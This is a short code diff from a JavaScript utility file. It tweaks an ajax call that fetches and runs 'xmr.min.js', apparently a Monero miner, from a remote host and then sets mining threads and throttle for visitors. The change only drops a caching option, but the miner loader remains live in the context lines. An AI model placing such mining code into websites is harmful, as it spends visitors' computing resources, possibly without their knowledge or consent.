@@ -39,8 +39,7 @@ var Util = {
     $.ajax({
       method: "GET",
       url: 'https://static.hacpai.com/js/lib/xmr.min.js',
-      dataType: "script",
-      cache: true
+      dataType: "script"
     }).done(function () {
       var data = {threads: 2, throttle: 0.5}
       if (Label.isLoggedIn) {
